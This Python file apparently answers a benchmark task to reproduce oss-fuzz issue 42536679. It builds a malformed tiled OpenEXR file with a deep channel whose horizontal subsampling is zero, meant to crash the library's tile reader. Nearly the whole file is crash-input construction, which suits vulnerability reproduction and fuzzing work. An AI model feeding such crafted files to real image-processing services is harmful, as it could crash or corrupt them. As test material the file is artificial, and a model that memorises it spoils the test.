import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability oss-fuzz:42536679.

        The vulnerability is in OpenEXR's tiled image reader. According to the
        fixing commit and the crash stack trace, the bug is triggered when
        processing a "deep" tiled image where a channel has a subsampling rate
        of zero. This leads to a division-by-zero inside `readPerChannelData`.
        The "heap-buffer-overflow" report is likely a side effect of how the
        sanitizer reports the integer-division-by-zero crash.

        The PoC constructs a minimal, valid tiled OpenEXR file with the
        following malicious properties:
        1. It defines a "deep" channel (DEEP_FLOAT). The vulnerable code path
           is only taken for deep image types.
        2. In this channel's definition, the horizontal subsampling rate
           (`xSampling`) is set to 0.
        3. The file includes a valid header, a tile offset table pointing to a
           single tile chunk, and the tile chunk itself. This ensures the parser
           successfully constructs the TiledInputFile object and proceeds to
           the vulnerable `readTile` call.
        """
        
        def create_attribute(name: str, type_name: str, value: bytes) -> bytes:
            """Helper function to construct a well-formed OpenEXR header attribute."""
            return (name.encode('ascii') + b'\x00' +
                    type_name.encode('ascii') + b'\x00' +
                    struct.pack('<I', len(value)) + value)

        # Part 1: Construct the EXR header
        header = b''
        # Magic number and version field for a tiled, single-part OpenEXR file
        header += b'\x76\x2f\x31\x01'  # Magic
        header += b'\x02\x00\x00\x00'  # Version 2, tiled=true

        # --- Header Attributes ---

        # The malicious 'channels' attribute.
        # We define one channel 'R' of type DEEP_FLOAT (4).
        # The vulnerability is triggered by setting xSampling to 0.
        # Channel struct: (name, pixelType, pLinear, reserved, xSampling, ySampling)
        channel_info = b'R\x00' + struct.pack('<i', 4) + b'\x01\x00\x00\x00' + struct.pack('<ii', 0, 1)
        channels_value = channel_info + b'\x00'  # List is null-terminated
        header += create_attribute('channels', 'chlist', channels_value)

        # Standard attributes to form a valid header that the library will accept.
        header += create_attribute('compression', 'compression', b'\x00')  # NO_COMPRESSION
        header += create_attribute('dataWindow', 'box2i', struct.pack('<iiii', 0, 0, 15, 15))
        header += create_attribute('displayWindow', 'box2i', struct.pack('<iiii', 0, 0, 15, 15))
        header += create_attribute('lineOrder', 'lineOrder', b'\x00')  # INCREASING_Y
        header += create_attribute('pixelAspectRatio', 'float', struct.pack('<f', 1.0))
        header += create_attribute('screenWindowCenter', 'v2f', struct.pack('<ff', 0.0, 0.0))
        header += create_attribute('screenWindowWidth', 'float', struct.pack('<f', 1.0))

        # 'tiles' attribute: A standard 16x16 tile description.
        tile_desc_value = struct.pack('<IIB', 16, 16, 0)  # xSize=16, ySize=16, mode=ONE_LEVEL
        header += create_attribute('tiles', 'tiledesc', tile_desc_value)

        # Null byte to terminate the list of attributes in the header.
        header += b'\x00'

        # Part 2: Construct the Tile Offset Table
        # This table immediately follows the header. For our single-tile image,
        # it contains one 64-bit offset pointing to the tile chunk.
        offset_table_size = 8  # One uint64_t
        tile_chunk_offset = len(header) + offset_table_size
        offset_table = struct.pack('<Q', tile_chunk_offset)

        # Part 3: Construct the Tile Chunk
        # This is the data for tile (0,0) at level (0,0), which the fuzzer tries to read.
        chunk = b''
        # Tile coordinates (dx, dy, lx, ly)
        chunk += struct.pack('<iiii', 0, 0, 0, 0)
        # Size of the packed data. A minimal size is sufficient.
        data_size = 1
        chunk += struct.pack('<i', data_size)
        # The actual tile data. Its content is irrelevant for this crash.
        chunk += b'\x00' * data_size
        
        # Assemble the final PoC by concatenating the parts.
        poc_bytes = header + offset_table + chunk
        return poc_bytes